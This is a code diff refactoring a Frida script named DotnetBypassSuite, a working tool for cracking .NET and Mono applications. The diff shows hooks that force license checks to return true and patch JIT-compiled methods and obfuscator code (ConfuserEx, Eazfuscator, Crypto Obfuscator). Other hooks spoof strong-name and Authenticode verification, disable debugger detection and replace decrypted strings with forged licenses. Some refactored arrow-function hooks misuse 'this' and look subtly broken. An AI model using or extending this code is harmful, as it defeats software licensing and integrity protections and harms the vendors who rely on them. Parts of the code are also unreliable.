@@ -156,14 +156,12 @@ const DotnetBypassSuite = {
 
     // Detect CLR type and version
     detectCLR: function () {
-        var self = this;
+        Process.enumerateModules().forEach(module => {
+          const name = module.name.toLowerCase();
 
-        Process.enumerateModules().forEach(function (module) {
-            var name = module.name.toLowerCase();
-
-            if (name.includes('clr.dll')) {
-                self.clrModule = module;
-                self.isCoreCLR = false;
+          if (name.includes('clr.dll')) {
+                this.clrModule = module;
+                this.isCoreCLR = false;
                 send({
                     type: 'info',
                     target: 'dotnet_bypass_suite',
@@ -171,8 +169,8 @@ const DotnetBypassSuite = {
                     module_name: module.name,
                 });
             } else if (name.includes('coreclr.dll')) {
-                self.clrModule = module;
-                self.isCoreCLR = true;
+                this.clrModule = module;
+                this.isCoreCLR = true;
                 send({
                     type: 'info',
                     target: 'dotnet_bypass_suite',
@@ -180,7 +178,7 @@ const DotnetBypassSuite = {
                     module_name: module.name,
                 });
             } else if (name.includes('mono')) {
-                self.monoModule = module;
+                this.monoModule = module;
                 send({
                     type: 'info',
                     target: 'dotnet_bypass_suite',
@@ -193,8 +191,6 @@ const DotnetBypassSuite = {
 
     // Hook .NET Framework
     hookDotNetFramework: function () {
-        var self = this;
-
         // Hook assembly loading
         this.hookAssemblyLoad();
 
@@ -216,27 +212,27 @@ const DotnetBypassSuite = {
 
     // Hook Mono runtime
     hookMono: function () {
-        var self = this;
+      const self = this;
 
-        send({
+      send({
             type: 'info',
             target: 'dotnet_bypass_suite',
             action: 'hooking_mono_runtime',
         });
 
-        var monoImageOpen = Module.findExportByName(this.monoModule.name, 'mono_image_open');
-        if (monoImageOpen) {
+      const monoImageOpen = Module.findExportByName(this.monoModule.name, 'mono_image_open');
+      if (monoImageOpen) {
             Interceptor.attach(monoImageOpen, {
-                onEnter: function (args) {
-                    var imageName = args[0].readUtf8String();
-                    send({
+                onEnter: args => {
+                  const imageName = args[0].readUtf8String();
+                  send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'mono_image_opening',
                         image_name: imageName,
                     });
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     if (!retval.isNull()) {
                         self.processMonoImage(retval);
                     }
@@ -245,27 +241,27 @@ const DotnetBypassSuite = {
             this.stats.methodsHooked++;
         }
 
-        var monoMethodGetName = Module.findExportByName(
-            this.monoModule.name,
-            'mono_method_get_name'
-        );
-        if (monoMethodGetName) {
+      const monoMethodGetName = Module.findExportByName(
+        this.monoModule.name,
+        'mono_method_get_name'
+      );
+      if (monoMethodGetName) {
             this.monoMethodGetName = new NativeFunction(monoMethodGetName, 'pointer', ['pointer']);
         }
 
-        var monoCompileMethod = Module.findExportByName(
-            this.monoModule.name,
-            'mono_compile_method'
-        );
-        if (monoCompileMethod) {
+      const monoCompileMethod = Module.findExportByName(
+        this.monoModule.name,
+        'mono_compile_method'
+      );
+      if (monoCompileMethod) {
             Interceptor.attach(monoCompileMethod, {
                 onEnter: function (args) {
-                    var method = args[0];
-                    if (method && !method.isNull() && self.monoMethodGetName) {
-                        var namePtr = self.monoMethodGetName(method);
-                        if (namePtr && !namePtr.isNull()) {
-                            var methodName = namePtr.readUtf8String();
-                            if (self.isLicenseMethod(methodName)) {
+                  const method = args[0];
+                  if (method && !method.isNull() && self.monoMethodGetName) {
+                      const namePtr = self.monoMethodGetName(method);
+                      if (namePtr && !namePtr.isNull()) {
+                          const methodName = namePtr.readUtf8String();
+                          if (self.isLicenseMethod(methodName)) {
                                 send({
                                     type: 'bypass',
                                     target: 'dotnet_bypass_suite',
@@ -280,7 +276,7 @@ const DotnetBypassSuite = {
                 },
                 onLeave: function (retval) {
                     if (this.shouldPatch && !retval.isNull()) {
-                        Memory.patchCode(retval, 3, function (code) {
+                        Memory.patchCode(retval, 3, code => {
                             code.putU8(0xb0);
                             code.putU8(0x01);
                             code.putU8(0xc3);
@@ -295,8 +291,6 @@ const DotnetBypassSuite = {
 
     // Hook .NET Core runtime
     hookDotNetCore: function () {
-        var self = this;
-
         send({
             type: 'info',
             target: 'dotnet_bypass_suite',
@@ -309,17 +303,17 @@ const DotnetBypassSuite = {
         this.hookReflectionAPIs();
         this.hookSecurityAPIs();
 
-        var coreClrInitialize = Module.findExportByName(this.clrModule.name, 'coreclr_initialize');
-        if (coreClrInitialize) {
+      const coreClrInitialize = Module.findExportByName(this.clrModule.name, 'coreclr_initialize');
+      if (coreClrInitialize) {
             Interceptor.attach(coreClrInitialize, {
-                onEnter: function (args) {
+                onEnter: _args => {
                     send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'coreclr_initializing',
                     });
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     if (retval.toInt32() === 0) {
                         send({
                             type: 'success',
@@ -332,15 +326,15 @@ const DotnetBypassSuite = {
             this.stats.methodsHooked++;
         }
 
-        var coreClrExecuteAssembly = Module.findExportByName(
-            this.clrModule.name,
-            'coreclr_execute_assembly'
-        );
-        if (coreClrExecuteAssembly) {
+      const coreClrExecuteAssembly = Module.findExportByName(
+        this.clrModule.name,
+        'coreclr_execute_assembly'
+      );
+      if (coreClrExecuteAssembly) {
             Interceptor.attach(coreClrExecuteAssembly, {
-                onEnter: function (args) {
-                    var assemblyPath = args[2].readUtf8String();
-                    send({
+                onEnter: args => {
+                  const assemblyPath = args[2].readUtf8String();
+                  send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'coreclr_executing_assembly',
@@ -366,29 +360,29 @@ const DotnetBypassSuite = {
 
     // Hook assembly loading
     hookAssemblyLoad: function () {
-        var self = this;
+      const self = this;
 
-        // Assembly::Load
-        var assemblyLoad = Module.findExportByName(this.clrModule.name, 'Assembly_Load');
-        if (!assemblyLoad) {
+      // Assembly::Load
+      let assemblyLoad = Module.findExportByName(this.clrModule.name, 'Assembly_Load');
+      if (!assemblyLoad) {
             // Try pattern matching
-            var pattern = '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9';
-            var matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, pattern);
-            if (matches.length > 0) {
+          const pattern = '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F9';
+          const matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, pattern);
+          if (matches.length > 0) {
                 assemblyLoad = matches[0].address;
             }
         }
 
         if (assemblyLoad) {
             Interceptor.attach(assemblyLoad, {
-                onEnter: function (args) {
+                onEnter: _args => {
                     send({
                         type: 'info',
                         target: 'dotnet_bypass_suite',
                         action: 'assembly_loading',
                     });
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     if (!retval.isNull()) {
                         self.processLoadedAssembly(retval);
                     }
@@ -398,16 +392,16 @@ const DotnetBypassSuite = {
         }
 
         // AppDomain::LoadAssembly
-        var appDomainLoad = Module.findExportByName(this.clrModule.name, 'AppDomain_LoadAssembly');
-        if (appDomainLoad) {
+      const appDomainLoad = Module.findExportByName(this.clrModule.name, 'AppDomain_LoadAssembly');
+      if (appDomainLoad) {
             Interceptor.attach(appDomainLoad, {
                 onEnter: function (args) {
                     this.assemblyPath = args[1];
                 },
                 onLeave: function (retval) {
                     if (!retval.isNull() && this.assemblyPath) {
-                        var path = this.assemblyPath.readUtf16String();
-                        send({
+                      const path = this.assemblyPath.readUtf16String();
+                      send({
                             type: 'info',
                             target: 'dotnet_bypass_suite',
                             action: 'assembly_loaded',
@@ -428,13 +422,11 @@ const DotnetBypassSuite = {
 
     // Process loaded assembly
     processLoadedAssembly: function (assembly) {
-        var self = this;
-
         // Get assembly name
-        var getNameMethod = this.findMethodInVTable(assembly, 'GetName');
-        if (getNameMethod) {
-            var name = new NativeFunction(getNameMethod, 'pointer', ['pointer'])(assembly);
-            send({
+      const getNameMethod = this.findMethodInVTable(assembly, 'GetName');
+      if (getNameMethod) {
+          const name = new NativeFunction(getNameMethod, 'pointer', ['pointer'])(assembly);
+          send({
                 type: 'info',
                 target: 'dotnet_bypass_suite',
                 action: 'processing_assembly',
@@ -451,30 +443,30 @@ const DotnetBypassSuite = {
 
     // Hook JIT compilation
     hookJITCompilation: function () {
-        var self = this;
+      const self = this;
 
-        // getJit
-        var getJit = Module.findExportByName(this.clrModule.name, 'getJit');
-        if (getJit) {
-            var jitInterface = new NativeFunction(getJit, 'pointer', [])();
+      // getJit
+      const getJit = Module.findExportByName(this.clrModule.name, 'getJit');
+      if (getJit) {
+          const jitInterface = new NativeFunction(getJit, 'pointer', [])();
 
-            if (jitInterface) {
+          if (jitInterface) {
                 // Hook compileMethod
-                var compileMethodOffset = this.isCoreCLR ? 0x0 : 0x28; // Offset in vtable
-                var compileMethod = jitInterface
-                    .readPointer()
-                    .add(compileMethodOffset)
-                    .readPointer();
+              const compileMethodOffset = this.isCoreCLR ? 0x0 : 0x28; // Offset in vtable
+              const compileMethod = jitInterface
+                .readPointer()
+                .add(compileMethodOffset)
+                .readPointer();
 
-                Interceptor.attach(compileMethod, {
+              Interceptor.attach(compileMethod, {
                     onEnter: function (args) {
-                        var methodInfo = args[2];
+                      const methodInfo = args[2];
 
-                        if (methodInfo && !methodInfo.isNull()) {
-                            var methodDef = methodInfo.add(0x8).readPointer();
-                            var methodName = self.getMethodName(methodDef);
+                      if (methodInfo && !methodInfo.isNull()) {
+                          const methodDef = methodInfo.add(0x8).readPointer();
+                          const methodName = self.getMethodName(methodDef);
 
-                            // Check for license-related methods
+                          // Check for license-related methods
                             if (methodName && self.isLicenseMethod(methodName)) {
                                 send({
                                     type: 'bypass',
@@ -506,17 +498,17 @@ const DotnetBypassSuite = {
 
     // Hook metadata APIs
     hookMetadataAPIs: function () {
-        var self = this;
+      const self = this;
 
-        // MetaDataGetDispenser
-        var getDispenser = Module.findExportByName(this.clrModule.name, 'MetaDataGetDispenser');
-        if (getDispenser) {
+      // MetaDataGetDispenser
+      const getDispenser = Module.findExportByName(this.clrModule.name, 'MetaDataGetDispenser');
+      if (getDispenser) {
             Interceptor.attach(getDispenser, {
                 onLeave: function (retval) {
                     if (retval.toInt32() === 0) {
                         // S_OK
-                        var dispenser = this.context.r8.readPointer();
-                        self.hookMetadataDispenser(dispenser);
+                      const dispenser = this.context.r8.readPointer();
+                      self.hookMetadataDispenser(dispenser);
                     }
                 },
             });
@@ -526,18 +518,16 @@ const DotnetBypassSuite = {
 
     // Hook metadata dispenser
     hookMetadataDispenser: function (dispenser) {
-        var self = this;
-
         // Hook OpenScope to intercept assembly metadata access
-        var vtable = dispenser.readPointer();
-        var openScope = vtable.add(0x18).readPointer(); // IMetaDataDispenser::OpenScope
+      const vtable = dispenser.readPointer();
+      const openScope = vtable.add(0x18).readPointer(); // IMetaDataDispenser::OpenScope
 
         Interceptor.attach(openScope, {
-            onEnter: function (args) {
-                var filename = args[1].readUtf16String();
-                var openFlags = args[2].toInt32();
+            onEnter: args => {
+              const filename = args[1].readUtf16String();
+              const _openFlags = args[2].toInt32();
 
-                send({
+              send({
                     type: 'info',
                     target: 'dotnet_bypass_suite',
                     action: 'opening_metadata_scope',
@@ -545,7 +535,7 @@ const DotnetBypassSuite = {
                 });
 
                 // Check if it's a protected assembly
-                if (self.isProtectedAssembly(filename)) {
+                if (this.isProtectedAssembly(filename)) {
                     // Force read/write access
                     args[2] = ptr(0x1); // ofWrite
                 }
@@ -555,28 +545,26 @@ const DotnetBypassSuite = {
 
     // Hook string decryption
     hookStringDecryption: function () {
-        var self = this;
-
         // Common obfuscator string decryption patterns
-        var patterns = [
-            // Dotfuscator pattern
-            '48 89 5C 24 ?? 57 48 83 EC ?? 48 8B D9 48 8B FA E8',
-            // SmartAssembly pattern
-            '55 8B EC 83 EC ?? 53 56 57 8B 7D ?? 8B F1',
-            // ConfuserEx pattern
-            '28 ?? ?? ?? ?? 02 7B ?? ?? ?? ?? 2C',
-        ];
+      const patterns = [
+        // Dotfuscator pattern
+        '48 89 5C 24 ?? 57 48 83 EC ?? 48 8B D9 48 8B FA E8',
+        // SmartAssembly pattern
+        '55 8B EC 83 EC ?? 53 56 57 8B 7D ?? 8B F1',
+        // ConfuserEx pattern
+        '28 ?? ?? ?? ?? 02 7B ?? ?? ?? ?? 2C',
+      ];
 
-        patterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(self.clrModule.base, self.clrModule.size, pattern);
+      patterns.forEach(pattern => {
+          const matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, pattern);
 
-            matches.forEach(function (match) {
+          matches.forEach(match => {
                 Interceptor.attach(match.address, {
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         if (!retval.isNull()) {
                             try {
-                                var decrypted = retval.readUtf16String();
-                                if (decrypted && self.isLicenseString(decrypted)) {
+                              const decrypted = retval.readUtf16String();
+                              if (decrypted && this.isLicenseString(decrypted)) {
                                     send({
                                         type: 'bypass',
                                         target: 'dotnet_bypass_suite',
@@ -585,10 +573,10 @@ const DotnetBypassSuite = {
                                     });
 
                                     // Replace with valid license
-                                    var validLicense = self.generateValidLicense(decrypted);
-                                    retval.writeUtf16String(validLicense);
+                                  const validLicense = this.generateValidLicense(decrypted);
+                                  retval.writeUtf16String(validLicense);
 
-                                    self.stats.stringsDecrypted++;
+                                    this.stats.stringsDecrypted++;
                                 }
                             } catch (e) {
                                 send({
@@ -603,28 +591,28 @@ const DotnetBypassSuite = {
                         }
                     },
                 });
-                self.stats.methodsHooked++;
+                this.stats.methodsHooked++;
             });
         });
     },
 
     // Hook reflection APIs
     hookReflectionAPIs: function () {
-        var self = this;
+      const self = this;
 
-        // Type::InvokeMember
-        var invokeMember = this.findExportPattern(
-            'Type_InvokeMember',
-            '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57'
-        );
+      // Type::InvokeMember
+      const invokeMember = this.findExportPattern(
+        'Type_InvokeMember',
+        '48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 41 54 41 55 41 56 41 57'
+      );
 
-        if (invokeMember) {
+      if (invokeMember) {
             Interceptor.attach(invokeMember, {
                 onEnter: function (args) {
-                    var memberName = args[1].readUtf16String();
-                    var bindingFlags = args[2].toInt32();
+                  const memberName = args[1].readUtf16String();
+                  const _bindingFlags = args[2].toInt32();
 
-                    if (memberName && self.isLicenseMethod(memberName)) {
+                  if (memberName && self.isLicenseMethod(memberName)) {
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -638,8 +626,8 @@ const DotnetBypassSuite = {
                     if (this.isLicenseCheck && !retval.isNull()) {
                         // Ensure license check returns true
                         try {
-                            var result = retval.readU8();
-                            if (result === 0) {
+                          const result = retval.readU8();
+                          if (result === 0) {
                                 retval.writeU8(1);
                                 self.bypassedChecks++;
                             }
@@ -660,18 +648,18 @@ const DotnetBypassSuite = {
         }
 
         // MethodBase::Invoke
-        var methodInvoke = this.findExportPattern(
-            'MethodBase_Invoke',
-            '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B D9'
-        );
+      const methodInvoke = this.findExportPattern(
+        'MethodBase_Invoke',
+        '48 89 5C 24 ?? 48 89 74 24 ?? 57 48 83 EC ?? 48 8B F2 48 8B D9'
+      );
 
-        if (methodInvoke) {
+      if (methodInvoke) {
             Interceptor.attach(methodInvoke, {
                 onEnter: function (args) {
-                    var method = args[0];
-                    var methodName = self.getMethodName(method);
+                  const method = args[0];
+                  const methodName = self.getMethodName(method);
 
-                    if (methodName && self.isLicenseMethod(methodName)) {
+                  if (methodName && self.isLicenseMethod(methodName)) {
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -682,7 +670,7 @@ const DotnetBypassSuite = {
                         this.returnValue = args[4]; // out parameter
                     }
                 },
-                onLeave: function (retval) {
+                onLeave: function (_retval) {
                     if (this.isLicenseCheck && this.returnValue) {
                         // Modify return value
                         this.returnValue.writeU8(1); // true
@@ -696,18 +684,16 @@ const DotnetBypassSuite = {
 
     // Hook security APIs
     hookSecurityAPIs: function () {
-        var self = this;
-
         // StrongNameSignatureVerificationEx
-        var strongNameVerify = Module.findExportByName(
-            'mscoree.dll',
-            'StrongNameSignatureVerificationEx'
-        );
-        if (strongNameVerify) {
+      const strongNameVerify = Module.findExportByName(
+        'mscoree.dll',
+        'StrongNameSignatureVerificationEx'
+      );
+      if (strongNameVerify) {
             Interceptor.replace(
                 strongNameVerify,
                 new NativeCallback(
-                    function (wszFilePath, fForceVerification, pfWasVerified) {
+                    (_wszFilePath, _fForceVerification, pfWasVerified) => {
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -718,7 +704,7 @@ const DotnetBypassSuite = {
                             pfWasVerified.writeU8(1);
                         }
 
-                        self.stats.checksumsBypassed++;
+                        this.stats.checksumsBypassed++;
                         return 1; // TRUE
                     },
                     'int',
@@ -729,19 +715,19 @@ const DotnetBypassSuite = {
         }
 
         // Authenticode verification
-        var winVerifyTrust = Module.findExportByName('wintrust.dll', 'WinVerifyTrust');
-        if (winVerifyTrust) {
+      const winVerifyTrust = Module.findExportByName('wintrust.dll', 'WinVerifyTrust');
+      if (winVerifyTrust) {
             Interceptor.attach(winVerifyTrust, {
-                onLeave: function (retval) {
-                    var result = retval.toInt32();
-                    if (result !== 0) {
+                onLeave: retval => {
+                  const result = retval.toInt32();
+                  if (result !== 0) {
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
                             action: 'authenticode_verification_bypassed',
                         });
                         retval.replace(0); // ERROR_SUCCESS
-                        self.stats.checksumsBypassed++;
+                        this.stats.checksumsBypassed++;
                     }
                 },
             });
@@ -751,18 +737,16 @@ const DotnetBypassSuite = {
 
     // Hook anti-tamper mechanisms
     hookAntiTamper: function () {
-        var self = this;
-
         // Common anti-tamper checks
 
         // 1. Module checksum verification
-        var imageNtHeader = Module.findExportByName('ntdll.dll', 'RtlImageNtHeader');
-        if (imageNtHeader) {
+      const imageNtHeader = Module.findExportByName('ntdll.dll', 'RtlImageNtHeader');
+      if (imageNtHeader) {
             Interceptor.attach(imageNtHeader, {
-                onLeave: function (retval) {
+                onLeave: retval => {
                     if (!retval.isNull()) {
                         // Zero out checksum field
-                        var checksumOffset = 0x58; // IMAGE_NT_HEADERS->OptionalHeader.CheckSum
+                      const checksumOffset = 0x58; // IMAGE_NT_HEADERS->OptionalHeader.CheckSum
                         retval.add(checksumOffset).writeU32(0);
                     }
                 },
@@ -782,18 +766,18 @@ const DotnetBypassSuite = {
 
     // Hook hash APIs
     hookHashAPIs: function () {
-        var self = this;
+      const self = this;
 
-        // CryptHashData
-        var cryptHashData = Module.findExportByName('advapi32.dll', 'CryptHashData');
-        if (cryptHashData) {
+      // CryptHashData
+      const cryptHashData = Module.findExportByName('advapi32.dll', 'CryptHashData');
+      if (cryptHashData) {
             Interceptor.attach(cryptHashData, {
                 onEnter: function (args) {
-                    var hHash = args[0];
-                    var pbData = args[1];
-                    var dwDataLen = args[2].toInt32();
+                  const _hHash = args[0];
+                  const pbData = args[1];
+                  const dwDataLen = args[2].toInt32();
 
-                    // Check if hashing assembly data
+                  // Check if hashing assembly data
                     if (dwDataLen > 1024 && self.isAssemblyData(pbData, dwDataLen)) {
                         send({
                             type: 'bypass',
@@ -808,15 +792,15 @@ const DotnetBypassSuite = {
         }
 
         // BCryptHashData
-        var bcryptHashData = Module.findExportByName('bcrypt.dll', 'BCryptHashData');
-        if (bcryptHashData) {
+      const bcryptHashData = Module.findExportByName('bcrypt.dll', 'BCryptHashData');
+      if (bcryptHashData) {
             Interceptor.attach(bcryptHashData, {
                 onEnter: function (args) {
-                    var hHash = args[0];
-                    var pbInput = args[1];
-                    var cbInput = args[2].toInt32();
+                  const _hHash = args[0];
+                  const pbInput = args[1];
+                  const cbInput = args[2].toInt32();
 
-                    if (cbInput > 1024 && self.isAssemblyData(pbInput, cbInput)) {
+                  if (cbInput > 1024 && self.isAssemblyData(pbInput, cbInput)) {
                         send({
                             type: 'bypass',
                             target: 'dotnet_bypass_suite',
@@ -834,15 +818,15 @@ const DotnetBypassSuite = {
 
     // Hook debugger detection
     hookDebuggerDetection: function () {
-        var self = this;
+      const self = this;
 
-        // IsDebuggerPresent
-        var isDebuggerPresent = Module.findExportByName('kernel32.dll', 'IsDebuggerPresent');
-        if (isDebuggerPresent) {
+      // IsDebuggerPresent
+      const isDebuggerPresent = Module.findExportByName('kernel32.dll', 'IsDebuggerPresent');
+      if (isDebuggerPresent) {
             Interceptor.replace(
                 isDebuggerPresent,
                 new NativeCallback(
-                    function () {
+                    () => {
                         self.stats.debuggerChecksDisabled++;
                         return 0; // FALSE
                     },
@@ -854,15 +838,15 @@ const DotnetBypassSuite = {
         }
 
         // CheckRemoteDebuggerPresent
-        var checkRemoteDebugger = Module.findExportByName(
-            'kernel32.dll',
-            'CheckRemoteDebuggerPresent'
-        );
-        if (checkRemoteDebugger) {
+      const checkRemoteDebugger = Module.findExportByName(
+        'kernel32.dll',
+        'CheckRemoteDebuggerPresent'
+      );
+      if (checkRemoteDebugger) {
             Interceptor.attach(checkRemoteDebugger, {
                 onLeave: function (retval) {
-                    var pbDebuggerPresent = this.context.rdx;
-                    if (pbDebuggerPresent) {
+                  const pbDebuggerPresent = this.context.rdx;
+                  if (pbDebuggerPresent) {
                         pbDebuggerPresent.writeU8(0); // FALSE
                     }
                     retval.replace(1); // TRUE (success)
@@ -873,8 +857,8 @@ const DotnetBypassSuite = {
         }
 
         // NtQueryInformationProcess
-        var ntQueryInfoProcess = Module.findExportByName('ntdll.dll', 'NtQueryInformationProcess');
-        if (ntQueryInfoProcess) {
+      const ntQueryInfoProcess = Module.findExportByName('ntdll.dll', 'NtQueryInformationProcess');
+      if (ntQueryInfoProcess) {
             Interceptor.attach(ntQueryInfoProcess, {
                 onEnter: function (args) {
                     this.infoClass = args[1].toInt32();
@@ -902,22 +886,20 @@ const DotnetBypassSuite = {
 
     // Hook runtime integrity checks
     hookRuntimeIntegrity: function () {
-        var self = this;
-
         // Hook CLR internal integrity checks
-        var patterns = [
-            // Integrity check pattern 1
-            '48 89 5C 24 ?? 57 48 83 EC ?? 8B F9 E8 ?? ?? ?? ?? 48 8B D8 48 85 C0',
-            // Integrity check pattern 2
-            '40 53 48 83 EC ?? 48 8B D9 E8 ?? ?? ?? ?? 84 C0 74 ??',
-        ];
+      const patterns = [
+        // Integrity check pattern 1
+        '48 89 5C 24 ?? 57 48 83 EC ?? 8B F9 E8 ?? ?? ?? ?? 48 8B D8 48 85 C0',
+        // Integrity check pattern 2
+        '40 53 48 83 EC ?? 48 8B D9 E8 ?? ?? ?? ?? 84 C0 74 ??',
+      ];
 
-        patterns.forEach(function (pattern) {
-            var matches = Memory.scanSync(self.clrModule.base, self.clrModule.size, pattern);
+      patterns.forEach(pattern => {
+          const matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, pattern);
 
-            matches.forEach(function (match) {
+          matches.forEach(match => {
                 Interceptor.attach(match.address, {
-                    onLeave: function (retval) {
+                    onLeave: retval => {
                         // Force integrity check to pass
                         if (retval.toInt32() === 0) {
                             retval.replace(1);
@@ -926,7 +908,7 @@ const DotnetBypassSuite = {
                                 target: 'dotnet_bypass_suite',
                                 action: 'runtime_integrity_check_bypassed',
                             });
-                            self.stats.checksumsBypassed++;
+                            this.stats.checksumsBypassed++;
                         }
                     },
                 });
@@ -936,51 +918,49 @@ const DotnetBypassSuite = {
 
     // Hook known license check methods
     hookLicenseChecks: function () {
-        var self = this;
-
         // Common license check patterns
-        var licensePatterns = [
-            'IsLicenseValid',
-            'CheckLicense',
-            'ValidateLicense',
-            'VerifyLicense',
-            'IsActivated',
-            'IsTrial',
-            'HasExpired',
-            'GetLicenseStatus',
-        ];
+      const licensePatterns = [
+        'IsLicenseValid',
+        'CheckLicense',
+        'ValidateLicense',
+        'VerifyLicense',
+        'IsActivated',
+        'IsTrial',
+        'HasExpired',
+        'GetLicenseStatus',
+      ];
 
-        // Hook by method name pattern
-        licensePatterns.forEach(function (pattern) {
-            self.hookMethodByName(pattern, function (originalFunc) {
-                return new NativeCallback(
-                    function () {
-                        send({
-                            type: 'bypass',
-                            target: 'dotnet_bypass_suite',
-                            action: 'license_check_bypassed',
-                            pattern: pattern,
-                        });
-                        self.bypassedChecks++;
+      // Hook by method name pattern
+        licensePatterns.forEach(pattern => {
+            this.hookMethodByName(
+                pattern,
+                _originalFunc =>
+                    new NativeCallback(
+                        () => {
+                            send({
+                                type: 'bypass',
+                                target: 'dotnet_bypass_suite',
+                                action: 'license_check_bypassed',
+                                pattern: pattern,
+                            });
+                            this.bypassedChecks++;
 
-                        // Return success based on method name
-                        if (pattern.includes('Trial') || pattern.includes('Expired')) {
-                            return 0; // false
-                        } else {
-                            return 1; // true
-                        }
-                    },
-                    'int',
-                    ['pointer']
-                );
-            });
+                            // Return success based on method name
+                            if (pattern.includes('Trial') || pattern.includes('Expired')) {
+                                return 0; // false
+                            } else {
+                                return 1; // true
+                            }
+                        },
+                        'int',
+                        ['pointer']
+                    )
+            );
         });
     },
 
     // Hook obfuscator runtime
     hookObfuscatorRuntime: function () {
-        var self = this;
-
         // ConfuserEx runtime
         this.hookConfuserExRuntime();
 
@@ -993,16 +973,14 @@ const DotnetBypassSuite = {
 
     // Hook ConfuserEx runtime
     hookConfuserExRuntime: function () {
-        var self = this;
-
         // ConfuserEx anti-tamper
-        var antiTamperPattern = 'E8 ?? ?? ?? ?? 0A 06 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0A 00 DE ??';
-        var matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, antiTamperPattern);
+      const antiTamperPattern = 'E8 ?? ?? ?? ?? 0A 06 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0A 00 DE ??';
+      let matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, antiTamperPattern);
 
-        matches.forEach(function (match) {
+      matches.forEach(match => {
             // NOP out the anti-tamper check
-            Memory.patchCode(match.address, 5, function (code) {
-                for (var i = 0; i < 5; i++) {
+            Memory.patchCode(match.address, 5, code => {
+                for (let i = 0; i < 5; i++) {
                     code.putU8(0x90); // NOP
                 }
             });
@@ -1012,23 +990,23 @@ const DotnetBypassSuite = {
                 action: 'confuserex_anti_tamper_disabled',
                 address: match.address.toString(),
             });
-            self.stats.checksumsBypassed++;
+            this.stats.checksumsBypassed++;
         });
 
         // ConfuserEx constants decryption
-        var constDecryptPattern = '28 ?? ?? ?? ?? 8E 69 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 28';
-        matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, constDecryptPattern);
+      const constDecryptPattern = '28 ?? ?? ?? ?? 8E 69 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 28';
+      matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, constDecryptPattern);
 
-        matches.forEach(function (match) {
+        matches.forEach(match => {
             Interceptor.attach(match.address, {
-                onLeave: function (retval) {
+                onLeave: _retval => {
                     // Log decrypted constants
                     send({
                         type: 'bypass',
                         target: 'dotnet_bypass_suite',
                         action: 'confuserex_constant_decrypted',
                     });
-                    self.stats.stringsDecrypted++;
+                    this.stats.stringsDecrypted++;
                 },
             });
         });
@@ -1036,22 +1014,20 @@ const DotnetBypassSuite = {
 
     // Hook Eazfuscator runtime
     hookEazfuscatorRuntime: function () {
-        var self = this;
-
         // Eazfuscator string encryption
-        var stringPattern = '7E ?? ?? ?? ?? 02 7B ?? ?? ?? ?? 7E ?? ?? ?? ?? 28';
-        var matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, stringPattern);
+      const stringPattern = '7E ?? ?? ?? ?? 02 7B ?? ?? ?? ?? 7E ?? ?? ?? ?? 28';
+      const matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, stringPattern);
 
-        matches.forEach(function (match) {
+      matches.forEach(match => {
             Interceptor.attach(match.address, {
                 onEnter: function (args) {
                     this.stringId = args[0].toInt32();
                 },
-                onLeave: function (retval) {
+                onLeave: retval => {
                     if (!retval.isNull()) {
                         try {
-                            var decrypted = retval.readUtf16String();
-                            if (self.isLicenseString(decrypted)) {
+                          const decrypted = retval.readUtf16String();
+                          if (this.isLicenseString(decrypted)) {
                                 send({
                                     type: 'bypass',
                                     target: 'dotnet_bypass_suite',
@@ -1060,9 +1036,9 @@ const DotnetBypassSuite = {
                                 });
 
                                 // Replace with valid string
-                                var valid = self.generateValidLicense(decrypted);
-                                retval.writeUtf16String(valid);
-                                self.stats.stringsDecrypted++;
+                              const valid = this.generateValidLicense(decrypted);
+                              retval.writeUtf16String(valid);
+                                this.stats.stringsDecrypted++;
                             }
                         } catch (e) {
                             send({
@@ -1082,15 +1058,13 @@ const DotnetBypassSuite = {
 
     // Hook Crypto Obfuscator runtime
     hookCryptoObfuscatorRuntime: function () {
-        var self = this;
-
         // Crypto Obfuscator license check
-        var licensePattern = '14 0A 06 16 33 ?? 16 0A 2B ?? 17 0A 06 2A';
-        var matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, licensePattern);
+      const licensePattern = '14 0A 06 16 33 ?? 16 0A 2B ?? 17 0A 06 2A';
+      const matches = Memory.scanSync(this.clrModule.base, this.clrModule.size, licensePattern);
 
-        matches.forEach(function (match) {
+      matches.forEach(match => {
             // Patch to always return true
-            Memory.patchCode(match.address, 2, function (code) {
+            Memory.patchCode(match.address, 2, code => {
                 code.putU8(0x17); // ldc.i4.1
                 code.putU8(0x2a); // ret
             });
@@ -1099,18 +1073,18 @@ const DotnetBypassSuite = {
                 target: 'dotnet_bypass_suite',
                 action: 'crypto_obfuscator_license_check_patched',
             });
-            self.bypassedChecks++;
+            this.bypassedChecks++;
         });
     },
 
     // Helper: Find export by pattern
     findExportPattern: function (name, pattern) {
